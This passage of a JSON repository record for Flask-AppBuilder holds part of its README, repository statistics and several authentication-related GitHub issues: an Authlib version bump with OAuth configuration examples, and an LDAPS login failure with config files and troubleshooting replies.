propose new features, or even better contribute to this project.\n\n`Issues, bugs and new features <https://github.com/dpgaspar/Flask-AppBuilder/issues/new>`_\n\n`Contribute <https://github.com/dpgaspar/Flask-AppBuilder/fork>`_\n\nIncludes:\n---------\n\n  - Database\n      - SQLAlchemy, multiple database support: sqlite, MySQL, ORACLE, MSSQL, DB2 etc.\n      - Partial support for MongoDB using MongoEngine.\n      - Multiple database connections support (Vertical partitioning).\n      - Easy mixin audit to models (created/changed by user, and timestamps).\n  - Security\n      - Automatic permissions lookup, based on exposed methods. It will grant all permissions to the Admin Role.\n      - Inserts on the Database all the detailed permissions possible on your application.\n      - Public (no authentication needed) and Private permissions.\n      - Role based permissions.\n      - Authentication support for OAuth, OpenID, Database, LDAP and REMOTE_USER environ var.\n      - Support for self user registration.\n  - Views and Widgets\n      - Automatic menu generation.\n      - Automatic CRUD generation.\n      - Multiple actions on db records.\n      - Big variety of filters for your lists.\n      - Various view widgets: lists, master-detail, list of thumbnails etc\n      - Select2, Datepicker, DateTimePicker\n      - Related Select2 fields.\n      - Google charts with automatic group by or direct values and filters.\n      - AddOn system, write your own and contribute.\n  - CRUD REST API\n      - Automatic CRUD RESTful APIs.\n      - Internationalization\n      - Integration with flask-jwt-extended extension to protect your endpoints.\n      - Metadata for dynamic rendering.\n      - Selectable columns and metadata keys.\n      - Automatic and configurable data validation.\n  - Forms\n      - Automatic, Add, Edit and Show from Database Models\n      - Labels and descriptions for each field.\n      - Automatic base validators from model's definition.\n      - Custom validators, extra fields, custom filters for related dropdown lists.\n      - Image and File support for upload and database field association. It will handle everything for you.\n      - Field sets for Form's (Django style).\n  - i18n\n      - Support for multi-language via Babel\n  - Bootstrap 3.1.1 CSS and js, with Select2 and DatePicker\n  - Font-Awesome icons, for menu icons and actions.\n\n\nSome pictures\n-------------\n\nLogin page (with AUTH_DB)\n\n.. image:: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/login_db.png\n    :width: 480px\n    :target: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/login_db.png\n\n\nLogin page (with AUTH_OAUTH)\n\n.. image:: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/login_oauth.png\n    :width: 480px\n    :target: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/login_oauth.png\n\n\nSecurity\n\n.. image:: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/security.png\n    :width: 480px\n    :target: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/security.png\n\n\nLists:\n\nList contacts example\n\n.. image:: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/contact_list.png\n    :width: 480px\n    :target: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/contact_list.png\n\n\nList Group example with search\n\n.. image:: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/group_list.png\n    :width: 480px\n    :target: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/group_list.png\n\n\n\nCharts:\n\nGroup by pie chart\n\n.. image:: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/grouped_chart.png\n    :width: 480px\n    :target: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/grouped_chart.png\n\nDirect time chart\n\n.. image:: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/direct_chart.png\n    :width: 480px\n    :target: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/chart_time1.png\n\nGroup by time chart\n\n.. image:: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/chart_time2.png\n    :width: 480px\n    :target: https://raw.github.com/dpgaspar/flask-AppBuilder/master/images/chart_time2.png\n\n\nProjects/Organizations using FAB\n--------------------------------\n\nIf you would like to share your project, or let everyone know that you're using FAB\non your organization please submit a PR or send me an email with the details.\n\nProjects:\n\n- `Superset <https://github.com/apache/incubator-superset>`_ - a data exploration platform designed to be visual, intuitive, and interactive\n\n- `Airflow <https://github.com/apache/airflow>`_ - a platform to programmatically author, schedule, and monitor workflows.\n\n\nOrganizations:\n\n- Miniclip\n- EuroBIC\n- `On Beat Digital <https://onbeat.digital/>`_\n\n\nDepends on:\n-----------\n\n- flask\n- click\n- colorama\n- flask-sqlalchemy\n- flask-login\n- flask-openid\n- flask-wtform\n- flask-Babel\n",
        "num_commits": 3981,
        "project_age_days": 4007,
        "project_created_at": "2013-11-09",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-23",
        "num_contributors": 172,
        "num_pull": 994,
        "num_issues": 2280,
        "num_opening_issue": 204,
        "project_size(kB)": 44088,
        "num_stargazers": 4681,
        "num_watchers": 4681,
        "num_forks": 1359,
        "num_subscribers": 154,
        "SecurityPolicy_created_at": "2023-10-27 14:00:56",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "1c3af9b665ed9a3daf36673fee3327d0abf43e5b",
                "url": "https://github.com/dpgaspar/Flask-AppBuilder/commit/1c3af9b665ed9a3daf36673fee3327d0abf43e5b",
                "date": "2023-10-27 14:00:56"
            }
        ],
        "project_security_labels": [
            "security:crud",
            "security:permission",
            "security:auth"
        ],
        "security_issues": [
            {
                "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1861",
                "title": "update `Authlib` requirement to allow version 1.0.1",
                "labels": [
                    "dependency-bump",
                    "security:auth"
                ],
                "user": "thesuperzapper",
                "issue_author_association": "CONTRIBUTOR",
                "number": 1861,
                "id": 1274704062,
                "state": "closed",
                "project_created_at": "2022-06-17T07:58:52Z",
                "closed_at": "2022-07-12T10:46:34Z",
                "body": "Currently, we are [restricting `Authlib` to `<1.0.0`](https://github.com/dpgaspar/Flask-AppBuilder/blob/v4.1.1/setup.py#L72) in our requirements, authlib has now released version [1.0.1](https://docs.authlib.org/en/latest/changelog.html) with lots of fixes and security patches, we should update our pin to allow 1.0.1.\r\n\r\nLots of people have been inadvertently testing using 1.0.1 for us! This is because airflow [forgot to pin `authlib`](https://github.com/apache/airflow/commit/6d7fa874ff201af7f602be9c58a827998814bdd1#diff-60f61ab7a8d1910d86d9fda2261620314edcae5894d5aaa236b821c7256badd7R274) to the same versions as `Flask-AppBuilder`, so the latest `authlib` is always installed with airflow.\r\n\r\n@potiuk you may want to look at that!\r\n\r\n----\r\n\r\nThe main issues I see from people who have already tried to use 1.0.1, are related to `jwks_uri` not being set (rather than any actual issue with Flask-AppBuilder). \r\n\r\nThe error text is: `Error authorizing OAuth access token: Missing \"jwks_uri\" in metadata`, see related issues:\r\n- https://github.com/apache/superset/issues/13948#issuecomment-856981962\r\n- https://github.com/dpgaspar/Flask-AppBuilder/issues/1821\r\n- https://stackoverflow.com/questions/72035617/runtimeerror-missing-jwks-uri-in-metadata-for-flask-and-azure-ad-authlib\r\n\r\n---\r\n\r\nCurrently, all of our [OAUTH security examples](https://flask-appbuilder.readthedocs.io/en/latest/security.html#authentication-oauth) don't show setting `jwks_uri` which is [now required](https://docs.authlib.org/en/latest/client/frameworks.html#parsing-id-token) when using `id_token` auth.\r\nWe need to update our examples to set `jwks_uri` so they continue to work with `authlib` 1.0.1.\r\n\r\n__Example for Google with `jwks_url`:__\r\n\r\n```python\r\nOAUTH_PROVIDERS = [\r\n    {\r\n        \"name\": \"google\",\r\n        \"icon\": \"fa-google\",\r\n        \"token_key\": \"access_token\",\r\n        \"remote_app\": {\r\n            \"client_id\": \"GOOGLE_KEY\",\r\n            \"client_secret\": \"GOOGLE_SECRET\",\r\n            \"api_base_url\": \"https://www.googleapis.com/oauth2/v2/\",\r\n            \"client_kwargs\": {\"scope\": \"email profile\"},\r\n            \"access_token_url\": \"https://accounts.google.com/o/oauth2/token\",\r\n            \"authorize_url\": \"https://accounts.google.com/o/oauth2/auth\",\r\n            \"jwks_uri\": \"https://www.googleapis.com/oauth2/v3/certs\",\r\n        },\r\n    },\r\n]\r\n```\r\n\r\n---\r\n\r\nWe may also want to show setting `server_metadata_url` to an OpenID `/.well-known/openid-configuration` URL, (which replaces the need to set `authorize_url`, `access_token_url`, and `jwks_uri` so is a bit easier for people).\r\n\r\n__Example for Google with `server_metadata_url`:__\r\n\r\n```python\r\nOAUTH_PROVIDERS = [\r\n    {\r\n        \"name\": \"google\",\r\n        \"icon\": \"fa-google\",\r\n        \"token_key\": \"access_token\",\r\n        \"remote_app\": {\r\n            \"client_id\": \"GOOGLE_KEY\",\r\n            \"client_secret\": \"GOOGLE_SECRET\",\r\n            \"api_base_url\": \"https://www.googleapis.com/oauth2/v2/\",\r\n            \"server_metadata_url\": \"https://accounts.google.com/.well-known/openid-configuration\",\r\n            \"client_kwargs\": {\"scope\": \"email profile\"},\r\n        },\r\n    },\r\n]\r\n```\r\n\r\n__Example for Okta with `sever_metadata_url`:__\r\n\r\n```python\r\nOAUTH_PROVIDERS = [\r\n  {\r\n      \"name\": \"okta\",\r\n      \"icon\": \"fa-circle-o\",\r\n      \"token_key\": \"access_token\",\r\n      \"remote_app\": {\r\n          \"client_id\": \"OKTA_KEY\",\r\n          \"client_secret\": \"OKTA_SECRET\",\r\n          \"api_base_url\": \"https://OKTA_DOMAIN.okta.com/oauth2/v1/\",\r\n          \"server_metadata_url\": \"https://OKTA_DOMAIN.okta.com/.well-known/openid-configuration\",\r\n          \"client_kwargs\": {\"scope\": \"openid profile email groups\"},\r\n      },\r\n  },\r\n]\r\n```",
                "comments": [
                    {
                        "body": "@dpgaspar thoughts on this?",
                        "user": "thesuperzapper",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-06-17T07:59:08Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1861#issuecomment-1158603746"
                    },
                    {
                        "body": "> @potiuk you may want to look at that!\r\n\r\nAh. Cool yhanks for that. I will update it. Actually the setup.py entry is wrong in a different way. We should use \"flask-app-builder[oauth]\" as dependency there so that we do not have to manually sync dependencies when FAB updates it.\r\n\r\nBTW. We have just started to migrate to FAB 4.0 @thesuperzapper - you might want to join our crew of people who will help with testing it (there are many breaking changes in the underlying libraries). I've added you so to that you are aware and possibly help us with testing Airfflow  https://github.com/apache/airflow/issues/22397#issuecomment-1156603972 \r\n\r\nIn the meantime - indeed upgrading of the authlib in FAB 4.1.2 might be a good idea indeed (and once we use oauth extra, airflow deps will update automatically) \r\n",
                        "user": "potiuk",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-06-17T08:21:37Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1861#issuecomment-1158625004"
                    },
                    {
                        "body": "I'll open a PR to bump and test authlib",
                        "user": "dpgaspar",
                        "issue_author_association": "OWNER",
                        "project_created_at": "2022-06-17T08:24:05Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1861#issuecomment-1158626998"
                    },
                    {
                        "body": "Also @thesuperzapper we have a way to fix that for you users too (and ours). I am going to update constraint and re-generate docker images with authlib=1.0.0 ",
                        "user": "potiuk",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-06-17T08:28:12Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1861#issuecomment-1158630479"
                    },
                    {
                        "body": "@potiuk actually the version would need to be the last `0.X` version (which is `0.15.5`) for this `jwks_uri` issue not to be a problem.\r\n\r\nBut I think we may as well keep `1.0.1` as the authlib version in the docker containers (it's only installed in the 2.2.0 containers and later anyway). There are large amounts of fixes in the 1.0.X branch.",
                        "user": "thesuperzapper",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-06-17T08:33:41Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1861#issuecomment-1158635340"
                    },
                    {
                        "body": "Right....",
                        "user": "potiuk",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-06-17T09:32:05Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1861#issuecomment-1158690299"
                    },
                    {
                        "body": "I will fix it though anyway. \r\n",
                        "user": "potiuk",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-06-17T09:32:58Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1861#issuecomment-1158691025"
                    },
                    {
                        "body": "I prefer to get it \"*updated to latest authlib*\" in upcoming 2.3.3 (I hope we will upgrade to FAB 4 by then rather than break oauth for 2.2.5 - 2.3.2 users :)",
                        "user": "potiuk",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-06-17T09:47:27Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1861#issuecomment-1158702879"
                    },
                    {
                        "body": "BTW. 2.2.4 and below had 0.15.5",
                        "user": "potiuk",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-06-17T09:48:13Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1861#issuecomment-1158703458"
                    },
                    {
                        "body": "@thesuperzapper - FYI: all constraints and images of Airlfow 2.2.5, 2.3.0, 2.3.1. 2.3.2 are refreshed now.",
                        "user": "potiuk",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-06-17T11:39:07Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1861#issuecomment-1158786215"
                    },
                    {
                        "body": "the `authlib` bump (now is <2) is merge into master.\r\n\r\nThank you once more @thesuperzapper",
                        "user": "dpgaspar",
                        "issue_author_association": "OWNER",
                        "project_created_at": "2022-07-12T10:46:34Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1861#issuecomment-1181607305"
                    },
                    {
                        "body": "when i am using azure authentication in flask app builder getting this error :\r\n\r\nError returning OAuth user info: %s 'upn'\r\n2023-08-01 12:04:40,989:ERROR:flask_appbuilder.security.views:Error returning OAuth user info: 'upn'\r\n\r\ni have got jwt token credentials are verified but getting UPN key error\r\n\r\n\r\nhow can i resolve it \r\n",
                        "user": "Narender-007",
                        "issue_author_association": "NONE",
                        "project_created_at": "2023-08-01T06:38:12Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1861#issuecomment-1659660737"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1825",
                "title": "LDAPS Multiple Times Need to Signin",
                "labels": [
                    "question",
                    "pending",
                    "security:auth"
                ],
                "user": "caxefaizan",
                "issue_author_association": "NONE",
                "number": 1825,
                "id": 1194159698,
                "state": "open",
                "project_created_at": "2022-04-06T07:16:14Z",
                "closed_at": null,
                "body": "### Environment\r\n\r\nFlask-Appbuilder version: Flask-AppBuilder==3.4.1\r\n\r\npip freeze output:\r\nadal==1.2.7\r\nalembic==1.7.5\r\namqp==5.0.7\r\nanyio==3.4.0\r\napache-airflow==2.2.3\r\napache-airflow-providers-amazon==2.4.0\r\napache-airflow-providers-celery==2.1.0\r\napache-airflow-providers-cncf-kubernetes==2.2.0\r\napache-airflow-providers-docker==2.3.0\r\napache-airflow-providers-elasticsearch==2.1.0\r\napache-airflow-providers-ftp==2.0.1\r\napache-airflow-providers-google==6.2.0\r\napache-airflow-providers-grpc==2.0.1\r\napache-airflow-providers-hashicorp==2.1.1\r\napache-airflow-providers-http==2.0.1\r\napache-airflow-providers-imap==2.0.1\r\napache-airflow-providers-microsoft-azure==3.4.0\r\napache-airflow-providers-mysql==2.1.1\r\napache-airflow-providers-odbc==2.0.1\r\napache-airflow-providers-postgres==2.4.0\r\napache-airflow-providers-redis==2.0.1\r\napache-airflow-providers-sendgrid==2.0.1\r\napache-airflow-providers-sftp==2.3.0\r\napache-airflow-providers-slack==4.1.0\r\napache-airflow-providers-sqlite==2.0.1\r\napache-airflow-providers-ssh==2.3.0\r\napispec==3.3.2\r\nargcomplete==1.12.3\r\nasn1crypto==1.4.0\r\nattrs==20.3.0\r\nAuthlib==0.15.5\r\nazure-batch==11.0.0\r\nazure-common==1.1.27\r\nazure-core==1.21.1\r\nazure-cosmos==4.2.0\r\nazure-datalake-store==0.0.52\r\nazure-identity==1.7.1\r\nazure-keyvault==4.1.0\r\nazure-keyvault-certificates==4.3.0\r\nazure-keyvault-keys==4.4.0\r\nazure-keyvault-secrets==4.3.0\r\nazure-kusto-data==0.0.45\r\nazure-mgmt-containerinstance==1.5.0\r\nazure-mgmt-core==1.3.0\r\nazure-mgmt-datafactory==1.1.0\r\nazure-mgmt-datalake-nspkg==3.0.1\r\nazure-mgmt-datalake-store==0.5.0\r\nazure-mgmt-nspkg==3.0.2\r\nazure-mgmt-resource==20.0.0\r\nazure-nspkg==3.0.2\r\nazure-storage-blob==12.8.1\r\nazure-storage-common==2.1.0\r\nazure-storage-file==2.1.0\r\nBabel==2.9.1\r\nbackports.entry-points-selectable==1.1.1\r\nbcrypt==3.2.0\r\nbeautifulsoup4==4.10.0\r\nbilliard==3.6.4.0\r\nblinker==1.4\r\nboto3==1.18.65\r\nbotocore==1.21.65\r\ncached-property==1.5.2\r\ncachetools==4.2.2\r\ncattrs==1.5.0\r\ncelery==5.2.1\r\ncertifi==2020.12.5\r\ncffi==1.15.0\r\ncharset-normalizer==2.0.9\r\nclick==8.0.3\r\nclick-didyoumean==0.3.0\r\nclick-plugins==1.1.1\r\nclick-repl==0.2.0\r\nclickclick==20.10.2\r\ncloudpickle==1.4.1\r\ncolorama==0.4.4\r\ncolorlog==4.8.0\r\ncommonmark==0.9.1\r\ncroniter==1.0.15\r\ncryptography==3.4.8\r\ndask==2021.6.0\r\ndecorator==5.1.0\r\ndefusedxml==0.7.1\r\ndill==0.3.1.1\r\ndistlib==0.3.4\r\ndistributed==2.19.0\r\ndnspython==2.1.0\r\ndocker==5.0.3\r\ndocutils==0.16\r\nelasticsearch==7.13.4\r\nelasticsearch-dbapi==0.2.7\r\nelasticsearch-dsl==7.4.0\r\nemail-validator==1.1.3\r\neventlet==0.33.0\r\nfilelock==3.4.0\r\nFlask==1.1.2\r\nFlask-AppBuilder==3.4.1\r\nFlask-Babel==2.0.0\r\nFlask-Caching==1.10.1\r\nFlask-JWT-Extended==3.25.1\r\nFlask-Login==0.4.1\r\nFlask-OpenID==1.3.0\r\nFlask-SQLAlchemy==2.5.1\r\nFlask-WTF==0.14.3\r\nflower==1.0.0\r\nfsspec==2021.11.1\r\ngevent==21.12.0\r\ngoogle-ads==14.0.0\r\ngoogle-api-core==1.31.4\r\ngoogle-api-python-client==1.12.8\r\ngoogle-auth==1.35.0\r\ngoogle-auth-httplib2==0.1.0\r\ngoogle-auth-oauthlib==0.4.6\r\ngoogle-cloud-appengine-logging==1.1.0\r\ngoogle-cloud-audit-log==0.2.0\r\ngoogle-cloud-automl==2.5.2\r\ngoogle-cloud-bigquery==2.31.0\r\ngoogle-cloud-bigquery-datatransfer==3.4.1\r\ngoogle-cloud-bigquery-storage==2.10.1\r\ngoogle-cloud-bigtable==1.7.0\r\ngoogle-cloud-build==3.7.1\r\ngoogle-cloud-container==1.0.1\r\ngoogle-cloud-core==1.7.2\r\ngoogle-cloud-datacatalog==3.6.1\r\ngoogle-cloud-dataproc==3.1.1\r\ngoogle-cloud-dataproc-metastore==1.3.1\r\ngoogle-cloud-dlp==1.0.0\r\ngoogle-cloud-kms==2.10.1\r\ngoogle-cloud-language==1.3.0\r\ngoogle-cloud-logging==2.7.0\r\ngoogle-cloud-memcache==1.0.0\r\ngoogle-cloud-monitoring==2.8.0\r\ngoogle-cloud-os-login==2.5.1\r\ngoogle-cloud-pubsub==2.9.0\r\ngoogle-cloud-redis==2.5.0\r\ngoogle-cloud-secret-manager==1.0.0\r\ngoogle-cloud-spanner==1.19.1\r\ngoogle-cloud-speech==1.3.2\r\ngoogle-cloud-storage==1.43.0\r\ngoogle-cloud-tasks==2.7.1\r\ngoogle-cloud-texttospeech==1.0.1\r\ngoogle-cloud-translate==1.7.0\r\ngoogle-cloud-videointelligence==1.16.1\r\ngoogle-cloud-vision==1.0.0\r\ngoogle-cloud-workflows==1.5.0\r\ngoogle-crc32c==1.3.0\r\ngoogle-resumable-media==2.1.0\r\ngoogleapis-common-protos==1.54.0\r\ngraphviz==0.19.1\r\ngreenlet==1.1.2\r\ngrpc-google-iam-v1==0.12.3\r\ngrpcio==1.42.0\r\ngrpcio-gcp==0.2.2\r\ngunicorn==20.1.0\r\nh11==0.12.0\r\nHeapDict==1.0.1\r\nhttpcore==0.13.7\r\nhttplib2==0.19.1\r\nhttpx==0.19.0\r\nhumanize==3.13.1\r\nhvac==0.11.2\r\nidna==3.3\r\nimportlib-metadata==4.8.2\r\nimportlib-resources==5.4.0\r\ninflection==0.5.1\r\niso8601==1.0.2\r\nisodate==0.6.0\r\nitsdangerous==1.1.0\r\nJinja2==3.0.3\r\njmespath==0.10.0\r\njson-merge-patch==0.2\r\njsonpath-ng==1.5.3\r\njsonschema==3.2.0\r\nkombu==5.2.2\r\nkubernetes==11.0.0\r\nlazy-object-proxy==1.4.3\r\nldap3==2.9.1\r\nlibcst==0.3.23\r\nlocket==0.2.1\r\nlockfile==0.12.2\r\nlxml==4.7.0\r\nMako==1.1.6\r\nMarkdown==3.3.6\r\nMarkupSafe==2.0.1\r\nmarshmallow==3.14.1\r\nmarshmallow-enum==1.5.1\r\nmarshmallow-oneofschema==3.0.1\r\nmarshmallow-sqlalchemy==0.26.1\r\nmsal==1.16.0\r\nmsal-extensions==0.3.1\r\nmsgpack==1.0.3\r\nmsrest==0.6.21\r\nmsrestazure==0.6.4\r\nmypy-extensions==0.4.3\r\nmysql-connector-python==8.0.27\r\nmysqlclient==2.1.0\r\nnox==2020.12.31\r\nnumpy==1.20.3\r\noauthlib==3.1.1\r\nopenapi-schema-validator==0.1.5\r\nopenapi-spec-validator==0.3.1\r\npackaging==21.3\r\npandas==1.3.5\r\npandas-gbq==0.14.1\r\nparamiko==2.8.1\r\npartd==1.2.0\r\npendulum==2.1.2\r\nplatformdirs==2.4.0\r\nply==3.11\r\nportalocker==2.3.2\r\nprison==0.2.1\r\nprometheus-client==0.12.0\r\nprompt-toolkit==3.0.24\r\nproto-plus==1.18.1\r\nprotobuf==3.19.1\r\npsutil==5.8.0\r\npsycopg2-binary==2.9.2\r\npy==1.11.0\r\npyarrow==5.0.0\r\npyasn1==0.4.8\r\npyasn1-modules==0.2.8\r\npycparser==2.21\r\npydata-google-auth==1.3.0\r\nPygments==2.10.0\r\nPyJWT==1.7.1\r\nPyNaCl==1.4.0\r\npyodbc==4.0.32\r\npyOpenSSL==20.0.1\r\npyparsing==2.4.7\r\npyrsistent==0.18.0\r\npysftp==0.2.9\r\npython-daemon==2.3.0\r\npython-dateutil==2.8.2\r\npython-http-client==3.3.4\r\npython-ldap==3.4.0\r\npython-nvd3==0.15.0\r\npython-slugify==4.0.1\r\npython3-openid==3.2.0\r\npytz==2021.3\r\npytzdata==2020.1\r\nPyYAML==5.4.1\r\nredis==3.5.3\r\nredshift-connector==2.0.901\r\nrequests==2.26.0\r\nrequests-oauthlib==1.3.0\r\nrfc3986==1.5.0\r\nrich==10.16.0\r\nrsa==4.8\r\ns3transfer==0.5.0\r\nscramp==1.4.1\r\nsendgrid==6.9.2\r\nsetproctitle==1.2.2\r\nsix==1.16.0\r\nslack-sdk==3.13.0\r\nsniffio==1.2.0\r\nsortedcontainers==2.4.0\r\nsoupsieve==2.3.1\r\nSQLAlchemy==1.3.24\r\nSQLAlchemy-JSONField==1.0.0\r\nsqlalchemy-redshift==0.8.8\r\nSQLAlchemy-Utils==0.37.9\r\nsshtunnel==0.4.0\r\nstarkbank-ecdsa==2.0.3\r\nstatsd==3.3.0\r\nswagger-ui-bundle==0.0.9\r\ntabulate==0.8.9\r\ntblib==1.7.0\r\ntenacity==8.0.1\r\ntermcolor==1.1.0\r\ntext-unidecode==1.3\r\ntoolz==0.11.2\r\ntornado==6.1\r\ntyping-extensions==3.10.0.2\r\ntyping-inspect==0.7.1\r\nunicodecsv==0.14.1\r\nuritemplate==3.0.1\r\nurllib3==1.26.7\r\nvine==5.0.0\r\nvirtualenv==20.10.0\r\nwatchtower==1.0.6\r\nwcwidth==0.2.5\r\nwebsocket-client==1.2.3\r\nWerkzeug==1.0.1\r\nWTForms==2.3.3\r\nzict==2.0.0\r\nzipp==3.6.0\r\nzope.event==4.5.0\r\nzope.interface==5.4.0\r\n### Describe the expected results\r\n\r\nLogin should happen on the first attempt itself.\r\n\r\n### Describe the actual results\r\nIn the logs of the webserver i see this\r\n{manager.py:1153} ERROR - {'result': -1, 'desc': \"Can't contact LDAP server\", 'ctrls': [], 'info': '(unknown error code)'}\r\nMultiple Simultaneous Clicks logs us in.\r\n\r\n### Steps to reproduce\r\n\r\nThis is the webserver file in apache-airflow.\r\n```\r\n#webserver_config.py\r\n\r\nimport os\r\nfrom airflow.www.fab_security.manager import AUTH_LDAP\r\n\r\nAUTH_TYPE = AUTH_LDAP\r\nAUTH_LDAP_SERVER = \"ldaps://corporate.example.com.au:636\"\r\nAUTH_LDAP_USE_TLS = False\r\nAUTH_LDAP_ALLOW_SELF_SIGNED = False\r\nAUTH_LDAP_TLS_CACERTFILE = \"/usr/local/airflow/ldapcert/cert.crt\"\r\n\r\n# registration configs\r\nAUTH_USER_REGISTRATION = True  # allow users who are not already in the FAB DB\r\nAUTH_USER_REGISTRATION_ROLE = \"Public\"  # this role will be given in addition to any AUTH_ROLES_MAPPING\r\nAUTH_LDAP_FIRSTNAME_FIELD = \"givenName\"\r\nAUTH_LDAP_LASTNAME_FIELD = \"sn\"\r\nAUTH_LDAP_EMAIL_FIELD = \"mail\"  # if null in LDAP, email is set to: \"{username}@email.notfound\"\r\n\r\nAUTH_LDAP_SEARCH = \"ou=WFL,dc=corporate,dc=example,dc=com,dc=au\"  # the LDAP search base\r\nAUTH_LDAP_UID_FIELD = \"sAMAccountName\"  # the username field\r\nAUTH_LDAP_BIND_USER = \"{{ LDAP_BIND_USER }}\"  # the special bind username for search\r\nAUTH_LDAP_BIND_PASSWORD = \"{{ LDAP_PASSWORD }}\"\r\n\r\n# a mapping from LDAP DN to a list of FAB roles\r\nAUTH_ROLES_MAPPING = {\r\n    \"CN=Airflow2-Admin,OU=Security,OU=Groups,OU=WFL,DC=corporate,DC=example,DC=com,DC=au\": [\"Admin\"],\r\n    \"CN=Airflow2-Data-Engineers,OU=Security,OU=Groups,OU=WFL,DC=corporate,DC=example,DC=com,DC=au\": [\"Op\"],\r\n}\r\n\r\n# the LDAP user attribute which has their role DNs\r\nAUTH_LDAP_GROUP_FIELD = \"memberOf\"\r\n\r\n# if we should replace ALL the user's roles each login, or only on registration\r\nAUTH_ROLES_SYNC_AT_LOGIN = True\r\n\r\n# force users to re-auth after 30min of inactivity (to keep roles in sync)\r\nPERMANENT_SESSION_LIFETIME = 1800\r\n```\r\n\r\n",
                "comments": [
                    {
                        "body": "My first impression is that it could be something related with network, are you using a load balancer?\r\n\r\nHave you tried reproducing the issue using:\r\n```\r\nopenssl s_client -connect ldaps://corporate.example.com.au:636\r\n```\r\nfrom inside you Airflow web server?\r\n",
                        "user": "dpgaspar",
                        "issue_author_association": "OWNER",
                        "project_created_at": "2022-04-29T13:16:06Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1825#issuecomment-1113298656"
                    },
                    {
                        "body": "@caxefaizan I've found that the image for 2.3.0 (in my case specifically, we went from `apache/airflow:2.2.5-python3.9` to `apache/airflow:2.3.0-python3.9`), turns out the underlying base image went from being Debian 10 to Debian 11 and with this change, the `/etc/ldap/ldap.conf` is no longer present which exhibits this exact behavior and the super cryptic error. After spending half a day trying to find a solution, all what's really needed is to add `libldap-common` to the docker image and Airflow starts working again with LDAP just fine.\r\n \r\nSo, hopefully this will help you and someone else in the future!",
                        "user": "NikolaySokolov",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-05-13T18:24:40Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1825#issuecomment-1126322058"
                    },
                    {
                        "body": "@caxefaizan this might be related to https://github.com/dpgaspar/Flask-AppBuilder/pull/1846.\r\nYould you please give https://github.com/dpgaspar/Flask-AppBuilder/pull/1846 a try and see if it fixes you problem? You can get a idea on how to patch your flask installation here https://github.com/stackabletech/docker-images/pull/116",
                        "user": "sbernauer",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-05-17T12:15:56Z",
                        "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1825#issuecomment-1128795732"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/dpgaspar/Flask-AppBuilder/issues/1822",
                "title": "Can't evaluate criteria against alternate class <class 'app.sec_models.MyUser'>",
                "labels": [
                    "question",
                    "security:auth"
                ],
                "user": "soundmaking",
                "issue_author_association": "NONE",
                "number": 1822,
                "id": 1180132586,
                "state": "closed",
                "project_created_at": "2022-03-24T22:49:21Z",
                "closed_at": "2022-04-22T09:46:22Z",
